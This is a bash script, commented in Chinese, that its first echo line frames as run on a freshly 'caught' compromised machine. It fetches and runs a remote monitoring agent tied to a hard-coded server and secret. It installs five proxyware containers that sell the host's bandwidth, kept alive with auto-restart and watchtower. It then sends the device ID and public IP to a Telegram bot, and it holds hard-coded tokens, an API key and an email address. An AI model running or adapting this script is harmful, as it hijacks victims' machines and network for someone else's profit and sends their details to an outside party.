#!/bin/bash
echo "老板又抓到鸡啦？恭喜恭喜啊！！！"
# 更新APT包列表
sudo apt update

# 安装 unzip
echo "安装 unzip..."
sudo apt install -y unzip

# 安装并执行agent.sh脚本
echo "安装并执行 agent.sh..."
curl -L https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.sh -o agent.sh && chmod +x agent.sh && \
env NZ_SERVER=138.2.92.42:9981 NZ_TLS=false NZ_CLIENT_SECRET=RMw9rBte3K6MAALtanfPossnw1Z1RwKf ./agent.sh

# 安装 Docker
echo "安装 Docker..."
sudo apt install -y docker.io

# 安装 Docker Compose
echo "安装 Docker Compose..."
curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# 执行 Docker 命令
echo "启动 traffmonetizer..."
docker run --name traa -d traffmonetizer/cli_v2 start accept --token FfS7aIWXg3XZuMO+tiau5Y36klu9j4hY3N7AM3X6f6s=

echo "设置 traa 容器自动重启..."
docker update --restart=always traa

echo "启动 repocket..."
docker run --name repocket -e RP_EMAIL=boss.yangzhen@gmail.com -e RP_API_KEY=2567fdd2-7ca8-4980-ad33-0038676b95d2 -d --restart=always repocket/repocket

echo "设置 repocket 容器自动重启..."
docker update --restart=always repocket

echo "启动 earnfm..."
sudo docker stop watchtower; sudo docker rm watchtower; sudo docker rmi containrrr/watchtower; sudo docker stop earnfm-client; sudo docker rm earnfm-client; sudo docker rmi earnfm/earnfm-client:latest; sudo docker run -d --restart=always -e EARNFM_TOKEN="b0698014-763d-41e1-9b99-c891114ad549" --name earnfm-client earnfm/earnfm-client:latest && sudo docker run -d --restart=always --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --cleanup --include-stopped --include-restarting --revive-stopped --interval 60 earnfm-client

echo "启动 PacketStream"
sudo docker run -d --restart=always -e CID=6nYE --name psclient packetstream/psclient:latest 

echo "设置 PacketStream 容器自动重启..."
docker update --restart=always psclient

# 生成设备ID
device_id=$(cat /dev/urandom | LC_ALL=C tr -dc 'A-F0-9' | dd bs=1 count=64 2>/dev/null && echo)

# 输出生成的设备ID
echo "Generated device ID: $device_id"

# 使用 docker pull 下载 Proxyrack 镜像
echo "Pulling proxyrack image..."
docker pull proxyrack/pop

# 运行 Proxyrack 容器，并将生成的设备ID传递给UUID环境变量
echo "Starting proxyrack container with UUID $device_id..."
sudo docker run -d --name proxyrack --restart always -e UUID="$device_id" proxyrack/pop

echo "Proxyrack container is running with UUID: $device_id"

# 获取公共IPv4地址
ipv4_address=$(curl -s http://icanhazip.com)

# 输出获取的IPv4地址
echo "Public IPv4 address: $ipv4_address"

# Telegram Bot 配置
bot_token="7830106860:AAF_tDStMZZugfcrl3zWrdARswHMTVLCCok"        # 你的 Telegram Bot Token
chat_id="5553145286"            # 你的 Telegram 用户 ID

# 发送设备ID和IPv4地址到 Telegram
message="设备ID是: $device_id\ IP是: a$ipv4_address"
send_message="https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message"

# 发送请求
curl -s "$send_message" > /dev/null

echo "Device ID and IPv4 address sent to Telegram."

echo "老板，都安装完成了,小的退下了。"
